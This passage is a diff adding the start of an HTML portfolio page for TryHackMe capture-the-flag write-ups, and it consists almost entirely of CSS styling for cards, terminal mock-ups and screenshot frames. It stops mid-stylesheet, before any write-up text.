@@ -1,0 +1,1351 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Project 05 — TryHackMe CTF Write-ups | Gaurav Shirke</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --black:#020608;--bg:#050d10;--bg2:#091318;--bg3:#0d1c22;
+  --green:#00e5a0;--green2:#00ffb3;--cyan:#00d4ff;
+  --amber:#f5a623;--red:#ff3b5c;--purple:#a855f7;
+  --text:#b8cdd8;--muted:#4a6572;--border:#112030;
+  --glow:0 0 20px rgba(0,229,160,0.4),0 0 40px rgba(0,229,160,0.2);
+  --font-d:'Orbitron',sans-serif;--font-m:'Share Tech Mono',monospace;--font-b:'Rajdhani',sans-serif;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--black);color:var(--text);font-family:var(--font-b);font-size:16px;line-height:1.7;overflow-x:hidden;cursor:none;}
+/* CURSOR — exact from index.html */
+.cursor{width:12px;height:12px;background:var(--green);border-radius:50%;position:fixed;pointer-events:none;z-index:99999;transform:translate(-50%,-50%);mix-blend-mode:screen;transition:width .2s,height .2s,background .2s;}
+.cursor-ring{width:36px;height:36px;border:1px solid rgba(0,229,160,0.5);border-radius:50%;position:fixed;pointer-events:none;z-index:99998;transform:translate(-50%,-50%);transition:width .3s,height .3s;}
+/* BACKGROUND — exact from index.html */
+#matrix-canvas{position:fixed;inset:0;z-index:0;opacity:.045;pointer-events:none;}
+#particle-canvas{position:fixed;inset:0;z-index:0;opacity:.7;pointer-events:none;}
+.grid-bg{position:fixed;inset:0;z-index:0;background-image:linear-gradient(rgba(0,229,160,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,229,160,.03) 1px,transparent 1px);background-size:60px 60px;pointer-events:none;}
+.scanlines{position:fixed;inset:0;z-index:1;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,.07) 3px,rgba(0,0,0,.07) 4px);pointer-events:none;}
+.vignette{position:fixed;inset:0;z-index:0;background:radial-gradient(ellipse at center,transparent 40%,rgba(0,0,0,.65) 100%);pointer-events:none;}
+.progress{position:fixed;top:0;left:0;height:3px;background:linear-gradient(90deg,var(--green),var(--cyan));z-index:2000;transition:width .1s;width:0%;}
+/* NAV — exact from index.html */
+nav{position:fixed;top:0;left:0;right:0;z-index:1000;display:flex;align-items:center;justify-content:space-between;padding:0 48px;height:60px;background:rgba(5,13,16,.88);backdrop-filter:blur(16px);border-bottom:1px solid rgba(0,229,160,.1);}
+.nav-logo{font-family:var(--font-m);font-size:14px;color:var(--green);text-decoration:none;}
+.nav-logo .at{color:var(--cyan);}.nav-logo .pr{color:var(--muted);}
+.nav-back{font-family:var(--font-m);font-size:12px;color:var(--muted);text-decoration:none;letter-spacing:.06em;transition:color .3s;position:relative;}
+.nav-back::after{content:'';position:absolute;bottom:-4px;left:0;right:0;height:1px;background:var(--green);transform:scaleX(0);transition:transform .3s;}
+.nav-back:hover{color:var(--green);}.nav-back:hover::after{transform:scaleX(1);}
+.nav-st{display:flex;align-items:center;gap:8px;font-family:var(--font-m);font-size:11px;color:var(--muted);}
+.sdot{width:7px;height:7px;background:var(--green);border-radius:50%;animation:sdot 2s infinite;}
+@keyframes sdot{0%,100%{box-shadow:0 0 0 0 rgba(0,229,160,.6);}50%{box-shadow:0 0 0 6px rgba(0,229,160,0);}}
+/* LAYOUT */
+.container{position:relative;z-index:10;max-width:900px;margin:0 auto;padding:80px 48px 100px;}
+.crumb{font-family:var(--font-m);font-size:11px;color:var(--muted);letter-spacing:.08em;text-transform:uppercase;margin-bottom:20px;}
+.crumb a{color:var(--green);text-decoration:none;}
+.ptag{display:inline-flex;align-items:center;gap:8px;font-family:var(--font-m);font-size:11px;color:var(--amber);border:1px solid rgba(245,166,35,.3);background:rgba(245,166,35,.07);padding:5px 14px;border-radius:2px;margin-bottom:20px;letter-spacing:.1em;text-transform:uppercase;}
+h1{font-family:var(--font-d);font-size:clamp(22px,4vw,40px);font-weight:900;color:#fff;line-height:1.15;margin-bottom:16px;letter-spacing:.02em;}
+h1 em{font-style:normal;color:var(--green);}
+.pmeta{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:32px;}
+.pill{font-family:var(--font-m);font-size:11px;padding:4px 12px;border-radius:2px;border:1px solid var(--border);color:var(--muted);background:var(--bg2);}
+.pill.g{border-color:rgba(0,229,160,.3);color:var(--green);background:rgba(0,229,160,.07);}
+.pill.a{border-color:rgba(245,166,35,.3);color:var(--amber);background:rgba(245,166,35,.07);}
+.sbanner{display:flex;align-items:flex-start;gap:14px;background:rgba(0,229,160,.06);border:1px solid rgba(0,229,160,.2);border-radius:4px;padding:18px 22px;margin-bottom:48px;font-size:14px;color:var(--text);}
+.sbdot{width:9px;height:9px;background:var(--amber);border-radius:50%;flex-shrink:0;margin-top:5px;animation:pulse 2s infinite;}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(245,166,35,.6);}50%{box-shadow:0 0 0 7px rgba(245,166,35,0);}}
+/* TOC */
+.toc{background:var(--bg2);border:1px solid var(--border);border-radius:4px;padding:28px 32px;margin-bottom:56px;}
+.toc-title{font-family:var(--font-m);font-size:11px;color:var(--cyan);letter-spacing:.15em;text-transform:uppercase;margin-bottom:18px;}
+.toc ol{list-style:none;display:flex;flex-direction:column;gap:6px;counter-reset:tc;}
+.toc li{counter-increment:tc;display:flex;align-items:baseline;gap:10px;font-size:14px;}
+.toc li::before{content:counter(tc,decimal-leading-zero);font-family:var(--font-m);font-size:11px;color:var(--muted);flex-shrink:0;}
+.toc a{color:var(--text);text-decoration:none;transition:color .2s;}
+.toc a:hover{color:var(--green);}
+/* SECTIONS */
+.sec{margin-bottom:64px;}
+.anc{display:block;height:80px;margin-top:-80px;visibility:hidden;}
+.slabel{font-family:var(--font-m);font-size:11px;color:var(--cyan);letter-spacing:.15em;text-transform:uppercase;margin-bottom:16px;display:flex;align-items:center;gap:12px;}
+.slabel::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,rgba(0,229,160,.3),transparent);}
+h2{font-family:var(--font-d);font-size:clamp(17px,3vw,24px);font-weight:700;color:#fff;margin-bottom:20px;letter-spacing:.04em;}
+h3{font-family:var(--font-d);font-size:15px;font-weight:700;color:var(--green);margin:28px 0 12px;letter-spacing:.04em;}
+h4{font-family:var(--font-m);font-size:12px;color:var(--cyan);margin:20px 0 10px;letter-spacing:.08em;text-transform:uppercase;}
+p{font-size:15px;color:var(--text);opacity:.9;margin-bottom:14px;}
+strong{color:#fff;font-weight:600;}
+pre{background:var(--bg2);border:1px solid var(--border);border-radius:4px;padding:20px 22px;overflow-x:auto;margin:18px 0;}
+code{font-family:var(--font-m);font-size:12.5px;color:var(--green);line-height:1.65;}
+pre code{color:var(--green);}
+p code,li code,.sd code{font-family:var(--font-m);font-size:12px;background:rgba(0,229,160,.08);border:1px solid rgba(0,229,160,.15);border-radius:2px;padding:2px 6px;color:var(--green);}
+.cm{color:var(--muted);}
+.exp{background:rgba(0,229,160,.05);border:1px solid rgba(0,229,160,.2);border-left:3px solid var(--green);border-radius:0 4px 4px 0;padding:16px 20px;margin:16px 0;font-size:14px;}
+.exp-lbl{font-family:var(--font-m);font-size:10px;color:var(--green);letter-spacing:.1em;text-transform:uppercase;margin-bottom:8px;}
+.warn{background:rgba(245,166,35,.07);border:1px solid rgba(245,166,35,.25);border-left:3px solid var(--amber);border-radius:0 4px 4px 0;padding:16px 20px;margin:16px 0;font-size:14px;}
+.warn-lbl{font-family:var(--font-m);font-size:10px;color:var(--amber);letter-spacing:.1em;text-transform:uppercase;margin-bottom:8px;}
+.tip{background:rgba(0,212,255,.06);border:1px solid rgba(0,212,255,.2);border-left:3px solid var(--cyan);border-radius:0 4px 4px 0;padding:16px 20px;margin:16px 0;font-size:14px;}
+.tip-lbl{font-family:var(--font-m);font-size:10px;color:var(--cyan);letter-spacing:.1em;text-transform:uppercase;margin-bottom:8px;}
+.tw{overflow-x:auto;margin:20px 0;}
+table{width:100%;border-collapse:collapse;font-size:14px;}
+th{font-family:var(--font-m);font-size:11px;color:var(--cyan);text-transform:uppercase;letter-spacing:.08em;padding:10px 16px;border-bottom:1px solid rgba(0,229,160,.2);text-align:left;background:rgba(0,229,160,.04);}
+td{padding:10px 16px;border-bottom:1px solid var(--border);color:var(--text);}
+tr:last-child td{border-bottom:none;}
+tr:hover td{background:rgba(0,229,160,.025);}
+.steps{display:flex;flex-direction:column;gap:2px;margin:18px 0;}
+.step{display:flex;gap:18px;align-items:flex-start;background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:18px 22px;transition:border-color .3s,transform .3s,box-shadow .3s;position:relative;overflow:hidden;}
+.step::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:linear-gradient(180deg,var(--green),var(--cyan));opacity:0;transition:opacity .3s;}
+.step:hover{border-color:rgba(0,229,160,.3);transform:translateY(-2px);box-shadow:0 6px 30px rgba(0,0,0,.35);}
+.step:hover::before{opacity:1;}
+.sn{font-family:var(--font-d);font-size:20px;font-weight:900;color:var(--green);opacity:.35;min-width:26px;line-height:1.1;flex-shrink:0;}
+.sb{flex:1;}.st2{font-size:15px;font-weight:600;color:#fff;margin-bottom:5px;}
+.sd{font-size:14px;color:var(--muted);line-height:1.65;}
+.sd code{font-family:var(--font-m);font-size:11px;background:rgba(0,229,160,.08);border:1px solid rgba(0,229,160,.15);border-radius:2px;padding:1px 5px;color:var(--green);}
+.tgrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(165px,1fr));gap:1px;background:var(--border);border:1px solid var(--border);border-radius:4px;overflow:hidden;margin:18px 0;}
+.tc{background:var(--bg);padding:14px 16px;transition:background .3s;}
+.tc:hover{background:var(--bg2);}
+.tcn{font-size:14px;color:#fff;font-weight:600;margin-bottom:3px;}
+.tcd{font-size:11px;color:var(--muted);font-family:var(--font-m);}
+.metric-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:1px;background:var(--border);border:1px solid var(--border);border-radius:4px;overflow:hidden;margin:18px 0;}
+.metric{background:var(--bg);padding:18px 16px;text-align:center;transition:background .3s;}
+.metric:hover{background:var(--bg2);}
+.metric-num{font-family:var(--font-d);font-size:28px;font-weight:900;color:var(--green);line-height:1;text-shadow:0 0 18px rgba(0,229,160,.5);}
+.metric-num.red{color:var(--red);text-shadow:0 0 18px rgba(255,59,92,.4);}
+.metric-num.amber{color:var(--amber);text-shadow:0 0 18px rgba(245,166,35,.4);}
+.metric-num.cyan{color:var(--cyan);text-shadow:0 0 18px rgba(0,212,255,.4);}
+.metric-num.purple{color:var(--purple);text-shadow:0 0 18px rgba(168,85,247,.4);}
+.metric-lbl{font-family:var(--font-m);font-size:10px;color:var(--muted);letter-spacing:.1em;text-transform:uppercase;margin-top:5px;}
+.cl{list-style:none;display:flex;flex-direction:column;gap:10px;margin:18px 0;}
+.cl li{display:flex;align-items:flex-start;gap:12px;font-size:15px;color:var(--text);}
+.cl li::before{content:'☐';font-size:16px;color:var(--muted);flex-shrink:0;margin-top:1px;font-family:var(--font-m);}
+.ssnote{display:inline-flex;align-items:center;gap:6px;font-family:var(--font-m);font-size:11px;color:var(--amber);background:rgba(245,166,35,.07);border:1px solid rgba(245,166,35,.2);border-radius:2px;padding:4px 10px;margin:8px 0;}
+.pbox{background:var(--bg);border:1px solid rgba(0,229,160,.3);border-radius:4px;padding:32px;position:relative;overflow:hidden;margin-top:40px;}
+.pbox::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--green),var(--cyan));}
+.pbox-title{font-family:var(--font-d);font-size:15px;color:#fff;margin-bottom:16px;}
+.pver{background:var(--bg2);border:1px solid var(--border);border-radius:4px;padding:20px;margin-top:14px;font-size:14px;line-height:1.75;color:var(--text);position:relative;}
+.pvlbl{font-family:var(--font-m);font-size:10px;color:var(--cyan);letter-spacing:.1em;text-transform:uppercase;margin-bottom:10px;}
+.cbtn{position:absolute;top:12px;right:12px;font-family:var(--font-m);font-size:11px;padding:5px 12px;background:rgba(0,229,160,.1);border:1px solid rgba(0,229,160,.2);border-radius:2px;color:var(--green);cursor:pointer;transition:all .2s;letter-spacing:.06em;}
+.cbtn:hover{background:rgba(0,229,160,.2);}
+.tagrow{display:flex;flex-wrap:wrap;gap:8px;margin:14px 0;}
+.stag{font-family:var(--font-m);font-size:12px;padding:5px 12px;background:rgba(0,229,160,.05);border:1px solid rgba(0,229,160,.15);border-radius:2px;color:var(--text);cursor:none;transition:all .25s;position:relative;overflow:hidden;}
+.stag::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(0,229,160,.1),transparent);opacity:0;transition:opacity .25s;}
+.stag:hover{border-color:var(--green);color:var(--green);transform:scale(1.08) translateY(-2px);box-shadow:0 0 14px rgba(0,229,160,.3);}
+.stag:hover::before{opacity:1;}
+footer{position:relative;z-index:10;text-align:center;padding:26px 48px;border-top:1px solid var(--border);font-family:var(--font-m);font-size:12px;color:var(--muted);}
+footer a{color:var(--green);text-decoration:none;}footer span{color:var(--green);}
+@keyframes fu{from{opacity:0;transform:translateY(28px);}to{opacity:1;transform:translateY(0);}}
+.reveal{opacity:0;transform:translateY(32px);transition:opacity .7s cubic-bezier(.25,.46,.45,.94),transform .7s cubic-bezier(.25,.46,.45,.94);}
+.reveal.visible{opacity:1;transform:translateY(0);}
+.rd1{transition-delay:.1s;}.rd2{transition-delay:.2s;}.rd3{transition-delay:.3s;}.rd4{transition-delay:.4s;}
+::-webkit-scrollbar{width:4px;}::-webkit-scrollbar-track{background:var(--black);}
+::-webkit-scrollbar-thumb{background:rgba(0,229,160,.3);border-radius:2px;}
+::-webkit-scrollbar-thumb:hover{background:var(--green);}
+@media(max-width:768px){nav{padding:0 20px;}.container{padding:70px 20px 80px;}}
+
+/* ═══════════ ROOM CARDS ═══════════ */
+.room-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(265px,1fr));gap:12px;margin:20px 0;}
+.room-card{background:var(--bg);border:1px solid var(--border);border-radius:4px;overflow:hidden;transition:all .3s;position:relative;}
+.room-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--green),var(--cyan));transform:scaleX(0);transition:transform .4s;}
+.room-card:hover{border-color:rgba(0,229,160,.3);transform:translateY(-3px);box-shadow:0 12px 40px rgba(0,0,0,.5);}
+.room-card:hover::before{transform:scaleX(1);}
+.room-card-top{padding:16px 18px 0;display:flex;justify-content:space-between;align-items:flex-start;}
+.room-num{font-family:var(--font-m);font-size:10px;color:var(--muted);}
+.room-diff{font-family:var(--font-m);font-size:10px;padding:2px 8px;border-radius:2px;text-transform:uppercase;letter-spacing:.08em;}
+.room-diff.easy{background:rgba(0,229,160,.1);border:1px solid rgba(0,229,160,.25);color:var(--green);}
+.room-diff.med{background:rgba(245,166,35,.1);border:1px solid rgba(245,166,35,.25);color:var(--amber);}
+.room-diff.hard{background:rgba(255,59,92,.1);border:1px solid rgba(255,59,92,.25);color:var(--red);}
+.room-diff.planned{background:rgba(74,101,114,.1);border:1px solid rgba(74,101,114,.3);color:var(--muted);}
+.room-body{padding:12px 18px 16px;}
+.room-title{font-family:var(--font-d);font-size:13px;font-weight:700;color:#fff;margin-bottom:5px;line-height:1.3;}
+.room-desc{font-size:12px;color:var(--muted);line-height:1.6;margin-bottom:10px;}
+.room-tags{display:flex;flex-wrap:wrap;gap:5px;}
+.room-tag{font-family:var(--font-m);font-size:10px;padding:2px 7px;background:var(--bg3);border:1px solid var(--border);border-radius:2px;color:var(--muted);}
+.room-footer{padding:10px 18px;border-top:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;font-family:var(--font-m);font-size:11px;}
+.room-footer.done{color:var(--green);}
+.room-footer.planned{color:var(--muted);}
+.room-pts{font-family:var(--font-m);font-size:10px;color:var(--muted);}
+
+/* ═══════════ WRITE-UP CARD ═══════════ */
+.writeup-card{background:var(--bg);border:1px solid var(--border);border-radius:4px;overflow:hidden;margin-bottom:14px;transition:border-color .3s;}
+.writeup-card:hover{border-color:rgba(0,229,160,.25);}
+.wc-header{padding:16px 20px;display:flex;align-items:center;gap:14px;border-bottom:1px solid var(--border);}
+.wc-room-badge{font-family:var(--font-m);font-size:10px;padding:4px 10px;background:rgba(0,229,160,.08);border:1px solid rgba(0,229,160,.2);border-radius:2px;color:var(--green);flex-shrink:0;white-space:nowrap;}
+.wc-title{font-family:var(--font-d);font-size:14px;font-weight:700;color:#fff;flex:1;}
+.wc-diff{margin-left:auto;font-family:var(--font-m);font-size:10px;padding:3px 10px;border-radius:2px;}
+.wc-body{padding:18px 20px;}
+.wc-section-title{font-family:var(--font-m);font-size:10px;color:var(--cyan);text-transform:uppercase;letter-spacing:.1em;margin-bottom:8px;}
+.flag-box{background:var(--bg2);border:1px solid rgba(0,229,160,.3);border-radius:4px;padding:12px 16px;font-family:var(--font-m);font-size:13px;color:var(--green);display:flex;align-items:center;gap:10px;margin:10px 0;}
+.flag-box .flag-icon{font-size:16px;}
+.mitre-row{display:flex;flex-wrap:wrap;gap:6px;margin:8px 0;}
+.mitre-tag{font-family:var(--font-m);font-size:10px;padding:3px 8px;background:rgba(168,85,247,.08);border:1px solid rgba(168,85,247,.2);border-radius:2px;color:var(--purple);}
+.lesson-box{background:rgba(0,212,255,.05);border:1px solid rgba(0,212,255,.15);border-left:3px solid var(--cyan);border-radius:0 4px 4px 0;padding:12px 16px;font-size:14px;color:var(--text);margin:10px 0;}
+
+/* ═══════════ SKILL DOMAIN MAP ═══════════ */
+.domain-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px;margin:20px 0;}
+.domain-card{background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:16px;transition:all .3s;position:relative;overflow:hidden;}
+.domain-card::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:var(--green);}
+.domain-card:hover{border-color:rgba(0,229,160,.25);transform:translateY(-2px);}
+.domain-icon{font-size:20px;margin-bottom:8px;}
+.domain-name{font-family:var(--font-d);font-size:12px;font-weight:700;color:#fff;margin-bottom:4px;}
+.domain-rooms{font-family:var(--font-m);font-size:11px;color:var(--muted);}
+.domain-bar{height:4px;background:var(--border);border-radius:2px;margin-top:10px;overflow:hidden;}
+.domain-fill{height:100%;border-radius:2px;background:linear-gradient(90deg,var(--green),var(--cyan));}
+
+/* ═══════════ SCREENSHOT SYSTEM ═══════════ */
+.ss-wrap{margin:32px 0;}
+.ss-heading{font-family:var(--font-m);font-size:10px;color:var(--cyan);letter-spacing:.14em;text-transform:uppercase;margin-bottom:10px;display:flex;align-items:center;gap:10px;}
+.ss-heading::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,rgba(0,212,255,.25),transparent);}
+.ss-caption{display:flex;justify-content:space-between;align-items:center;margin-top:9px;padding:0 4px;}
+.ss-cap-text{font-family:var(--font-m);font-size:11px;color:var(--muted);}
+.ss-cap-num{font-family:var(--font-m);font-size:11px;color:var(--cyan);background:rgba(0,212,255,.08);border:1px solid rgba(0,212,255,.2);border-radius:2px;padding:2px 8px;}
+/* Browser chrome */
+.browser{border:1px solid #2a3a4a;border-radius:8px;overflow:hidden;box-shadow:0 24px 64px rgba(0,0,0,.8);}
+.browser-bar{display:flex;align-items:center;gap:8px;padding:10px 16px;background:#1a2535;border-bottom:1px solid #2a3a4a;}
+.b-dot{width:11px;height:11px;border-radius:50%;}
+.b-addr{flex:1;margin:0 12px;background:#0f1e2e;border:1px solid #2a3a4a;border-radius:4px;padding:5px 12px;font-family:monospace;font-size:11px;color:#5a7a90;display:flex;align-items:center;gap:6px;}
+/* Windows chrome */
+.win{border:1px solid #333;border-radius:8px;overflow:hidden;box-shadow:0 24px 64px rgba(0,0,0,.8);}
+.win-titlebar{display:flex;align-items:center;padding:0 12px;height:32px;background:#1f1f1f;border-bottom:1px solid #2a2a2a;gap:8px;}
+.win-icon{font-size:14px;}
+.win-title{font-family:'Segoe UI',sans-serif;font-size:12px;color:#ccc;flex:1;}
+.win-controls{display:flex;gap:0;margin-left:auto;}
+.win-btn{width:46px;height:32px;display:flex;align-items:center;justify-content:center;font-size:10px;color:#999;font-family:monospace;}
+.win-btn.close{background:transparent;}
+.win-btn.close:hover{background:#c42b1c;color:#fff;}
+
+/* ═══ SS-01: TryHackMe Dashboard ═══ */
+.thm-app{background:#1a1a2e;font-family:'Segoe UI',sans-serif;min-height:460px;}
+.thm-topbar{background:#0d0d1a;height:52px;display:flex;align-items:center;padding:0 20px;gap:16px;border-bottom:1px solid #2a2a40;}
+.thm-logo{font-size:18px;font-weight:700;color:#88cc00;letter-spacing:-.5px;}
+.thm-nav-link{font-size:12px;color:#7a8aaa;padding:0 14px;height:52px;display:flex;align-items:center;}
+.thm-nav-link.act{color:#fff;border-bottom:2px solid #88cc00;}
+.thm-user{margin-left:auto;display:flex;align-items:center;gap:10px;}
+.thm-rank-badge{font-family:monospace;font-size:11px;background:rgba(136,204,0,.1);border:1px solid rgba(136,204,0,.3);color:#88cc00;padding:3px 10px;border-radius:3px;}
+.thm-avatar{width:30px;height:30px;border-radius:50%;background:linear-gradient(135deg,#88cc00,#00c9a7);display:flex;align-items:center;justify-content:center;font-weight:700;font-size:12px;color:#000;}
+.thm-content{padding:22px 24px;}
+.thm-profile-banner{background:linear-gradient(135deg,#0f1e1a 0%,#1a2e1a 100%);border:1px solid rgba(136,204,0,.2);border-radius:8px;padding:18px 22px;margin-bottom:20px;display:flex;align-items:center;gap:20px;}
+.thm-avatar-lg{width:56px;height:56px;border-radius:50%;background:linear-gradient(135deg,#88cc00,#00c9a7);display:flex;align-items:center;justify-content:center;font-weight:900;font-size:20px;color:#000;flex-shrink:0;}
+.thm-profile-info{flex:1;}
+.thm-username{font-size:18px;font-weight:700;color:#fff;}
+.thm-tagline{font-size:12px;color:#7a9a8a;font-family:monospace;margin-top:2px;}
+.thm-profile-stats{display:flex;gap:20px;}
+.thm-pstat{text-align:center;}
+.thm-pstat-n{font-size:20px;font-weight:700;color:#88cc00;font-family:monospace;}
+.thm-pstat-l{font-size:10px;color:#5a7a6a;text-transform:uppercase;letter-spacing:.06em;margin-top:1px;}
+/* Progress / XP bar */
+.thm-xp-section{background:#111126;border:1px solid #2a2a40;border-radius:6px;padding:14px 18px;margin-bottom:16px;}
+.thm-xp-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;}
+.thm-xp-title{font-size:13px;font-weight:700;color:#fff;}
+.thm-xp-val{font-family:monospace;font-size:12px;color:#88cc00;}
+.thm-xp-track{height:10px;background:#2a2a40;border-radius:5px;overflow:hidden;}
+.thm-xp-fill{height:100%;border-radius:5px;background:linear-gradient(90deg,#559900,#88cc00);}
+.thm-xp-label{font-size:10px;color:#5a7a6a;margin-top:5px;display:flex;justify-content:space-between;}
+/* Room completion grid */
+.thm-rooms-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;}
+.thm-rooms-title{font-size:14px;font-weight:700;color:#fff;}
+.thm-rooms-count{font-family:monospace;font-size:11px;color:#5a7a6a;}
+.thm-room-list{display:grid;grid-template-columns:1fr 1fr;gap:8px;}
+.thm-room-item{background:#111126;border:1px solid #2a2a40;border-radius:4px;padding:10px 14px;display:flex;align-items:center;gap:10px;transition:border-color .2s;}
+.thm-room-item:hover{border-color:rgba(136,204,0,.3);}
+.thm-room-icon{font-size:18px;flex-shrink:0;}
+.thm-room-info{flex:1;}
+.thm-room-name{font-size:12px;font-weight:600;color:#d0e8c8;}
+.thm-room-meta{font-family:monospace;font-size:10px;color:#5a7a6a;margin-top:1px;}
+.thm-room-status{flex-shrink:0;}
+.thm-tick{width:18px;height:18px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:700;}
+.thm-tick.done{background:rgba(136,204,0,.15);border:1px solid rgba(136,204,0,.4);color:#88cc00;}
+.thm-tick.prog{background:rgba(245,166,35,.1);border:1px solid rgba(245,166,35,.3);color:#f5a623;}
+.thm-tick.todo{background:rgba(42,42,64,.5);border:1px solid #3a3a50;color:#5a7a6a;}
+/* Global rank */
+.thm-rank-section{background:#111126;border:1px solid #2a2a40;border-radius:6px;padding:14px 18px;margin-top:14px;display:flex;justify-content:space-between;align-items:center;}
+.thm-rank-left{display:flex;flex-direction:column;gap:3px;}
+.thm-rank-title{font-size:12px;color:#7a9a8a;text-transform:uppercase;letter-spacing:.06em;font-family:monospace;}
+.thm-rank-val{font-size:26px;font-weight:700;color:#88cc00;font-family:monospace;}
+.thm-rank-pct{font-size:11px;color:#5a7a6a;font-family:monospace;}
+.thm-streak{text-align:right;}
+.thm-streak-n{font-size:20px;font-weight:700;color:#f5a623;font-family:monospace;}
+.thm-streak-l{font-size:10px;color:#5a7a6a;text-transform:uppercase;letter-spacing:.06em;}
+
+/* ═══ SS-02: Kali Terminal - Privilege Escalation ═══ */
+.kali-term{background:#1a0e2e;font-family:'Consolas','Courier New',monospace;}
+.kali-term-bar{display:flex;align-items:center;padding:8px 14px;background:#120a22;border-bottom:1px solid #2a1a42;gap:8px;}
+.kali-term-dots{display:flex;gap:5px;}
+.kali-term-title{font-size:11px;color:#7a6a8a;margin:0 auto;}
+.kali-term-body{padding:16px 18px;font-size:12px;line-height:1.7;}
+.kt-line{display:flex;flex-wrap:wrap;gap:0;margin-bottom:2px;}
+.kt-prompt{color:#88cc00;flex-shrink:0;}
+.kt-path{color:#7ec8e3;flex-shrink:0;}
+.kt-dollar{color:#cc88ff;flex-shrink:0;margin:0 6px;}
+.kt-cmd{color:#fff;}
+.kt-out{color:#a0b8a8;display:block;margin-bottom:2px;padding-left:0;}
+.kt-out.red{color:#ff6b6b;}
+.kt-out.green{color:#88cc00;}
+.kt-out.yellow{color:#f5a623;}
+.kt-out.cyan{color:#7ec8e3;}
+.kt-out.purple{color:#cc88ff;}
+.kt-out.bold{font-weight:700;}
+.kt-flag{background:rgba(136,204,0,.1);border:1px solid rgba(136,204,0,.3);border-radius:3px;padding:8px 14px;margin:8px 0;display:flex;align-items:center;gap:10px;font-family:monospace;font-size:13px;color:#88cc00;}
+.kt-section{color:#7ec8e3;font-weight:700;margin:12px 0 4px;font-size:11px;text-transform:uppercase;letter-spacing:.1em;}
+
+/* ═══ SS-03: Windows PrivEsc Evidence ═══ */
+.win-ps-body{background:#012456;padding:0;min-height:380px;}
+.win-ps-title{background:#012456;padding:8px 14px;border-bottom:1px solid #003878;font-family:'Consolas',monospace;font-size:11px;color:#cccccc;display:flex;justify-content:space-between;}
+.ps-content{padding:14px 16px;font-family:'Consolas',monospace;font-size:12px;line-height:1.65;}
+.ps-prompt{color:#ffff00;display:block;margin-bottom:2px;}
+.ps-cmd{color:#fff;display:block;margin-bottom:2px;}
+.ps-out{color:#cccccc;display:block;margin-bottom:1px;}
+.ps-out.green{color:#00e0a0;}
+.ps-out.red{color:#ff6060;}
+.ps-out.cyan{color:#7ec8e3;}
+.ps-out.yellow{color:#ffff60;}
+.ps-out.head{color:#888;border-bottom:1px solid #224;padding-bottom:3px;margin-bottom:4px;}
+.ps-table-row{display:flex;gap:0;}
+.ps-col{display:inline-block;}
+.ps-flag{background:rgba(0,224,160,.08);border:1px solid rgba(0,224,160,.25);border-radius:3px;padding:8px 14px;margin:10px 0;font-family:monospace;font-size:13px;color:#00e0a0;display:flex;align-items:center;gap:10px;}
+
+/* ═══ SS-04: Flag Submission / Room Completion ═══ */
+.thm-room-view{background:#1a1a2e;font-family:'Segoe UI',sans-serif;min-height:440px;padding:20px 22px;}
+.thm-room-header{display:flex;align-items:flex-start;gap:16px;margin-bottom:20px;}
+.thm-room-thumb{width:56px;height:56px;background:linear-gradient(135deg,#1a3a1a,#2a5a2a);border:1px solid rgba(136,204,0,.25);border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:24px;flex-shrink:0;}
+.thm-room-header-info{flex:1;}
+.thm-room-title-h{font-size:22px;font-weight:700;color:#fff;margin-bottom:4px;}
+.thm-room-subtitle{font-size:12px;color:#7a9a8a;font-family:monospace;}
+.thm-room-badges{display:flex;gap:6px;margin-top:8px;}
+.thm-room-badge{font-size:10px;font-family:monospace;padding:3px 10px;border-radius:2px;text-transform:uppercase;letter-spacing:.06em;}
+.thm-room-badge.diff-hard{background:rgba(255,59,92,.1);border:1px solid rgba(255,59,92,.25);color:#ff3b5c;}
+.thm-room-badge.diff-med{background:rgba(245,166,35,.1);border:1px solid rgba(245,166,35,.25);color:#f5a623;}
+.thm-room-badge.diff-easy{background:rgba(136,204,0,.1);border:1px solid rgba(136,204,0,.25);color:#88cc00;}
+.thm-room-badge.cat{background:rgba(126,200,227,.1);border:1px solid rgba(126,200,227,.25);color:#7ec8e3;}
+/* Task list */
+.thm-tasks{background:#111126;border:1px solid #2a2a40;border-radius:6px;overflow:hidden;margin-bottom:16px;}
+.thm-tasks-header{padding:10px 16px;border-bottom:1px solid #2a2a40;background:#0d0d1a;display:flex;justify-content:space-between;}
+.thm-tasks-title{font-size:12px;font-weight:700;color:#fff;font-family:monospace;text-transform:uppercase;letter-spacing:.08em;}
+.thm-tasks-count{font-family:monospace;font-size:11px;color:#88cc00;}
+.thm-task-row{padding:11px 16px;border-bottom:1px solid rgba(42,42,64,.5);display:flex;align-items:center;gap:12px;}
+.thm-task-row:last-child{border-bottom:none;}
+.thm-task-check{width:18px;height:18px;border-radius:3px;display:flex;align-items:center;justify-content:center;font-size:11px;flex-shrink:0;}
